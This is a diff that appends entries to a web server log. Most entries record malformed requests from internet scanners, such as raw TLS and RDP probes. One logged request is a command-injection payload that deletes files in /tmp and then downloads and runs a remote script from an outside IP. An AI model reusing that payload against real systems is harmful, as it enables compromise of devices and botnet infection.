@@ -2517,3 +2517,25 @@ Traceback (most recent call last):
   File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
     raise KeyError('Session is disconnected')
 KeyError: 'Session is disconnected'
+Found images in google search for word : Regain success
+Saving img1
+5.8.11.202 - - [04/Dec/2024 07:07:42] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+66.175.213.4 - - [04/Dec/2024 07:46:01] code 400, message Bad request version ('À\x13À')
+Invalid session n8A1OofRvsm1pxF7AAA8 (further occurrences of this error will be logged with level INFO)
+152.42.214.50 - - [04/Dec/2024 08:02:59] code 400, message Bad request version ('À\x13À')
+178.128.54.126 - - [04/Dec/2024 08:03:00] code 400, message Bad request version ('À\x13À')
+35.216.185.223 - - [04/Dec/2024 10:07:08] code 400, message Bad request version ('À\x13À')
+80.66.76.130 - - [04/Dec/2024 10:10:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+198.235.24.12 - - [04/Dec/2024 13:31:19] code 400, message Bad request version ('À\x13À')
+198.235.24.12 - - [04/Dec/2024 13:31:19] code 400, message Bad request version ('À(À$À\x14À')
+5.8.11.202 - - [04/Dec/2024 13:35:33] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+39.175.49.133 - - [04/Dec/2024 14:13:20] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1')
+80.82.77.202 - - [04/Dec/2024 15:38:45] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+159.223.67.34 - - [04/Dec/2024 16:03:05] code 400, message Bad request version ('Âjk')
+152.42.247.210 - - [04/Dec/2024 16:03:14] code 400, message Bad request version ('À\x13À')
+162.142.125.215 - - [04/Dec/2024 16:27:47] code 505, message Invalid HTTP version (2.0)
+93.174.93.12 - - [04/Dec/2024 16:37:23] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+78.153.140.177 - - [04/Dec/2024 16:46:58] code 400, message Bad request syntax ("\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03¾ð!\x02>½ú|m\x9d\x9e¶\x1b7l\x14ÉÏË\x04¾è\x03;.·T'á\x04úÛ\x00\x008À,À")
+205.210.31.84 - - [04/Dec/2024 17:56:05] code 400, message Bad request version ('À\x13À')
+205.210.31.84 - - [04/Dec/2024 17:56:05] code 400, message Bad request version ('À(À$À\x14À')
+167.94.138.115 - - [04/Dec/2024 18:10:52] code 505, message Invalid HTTP version (2.0)
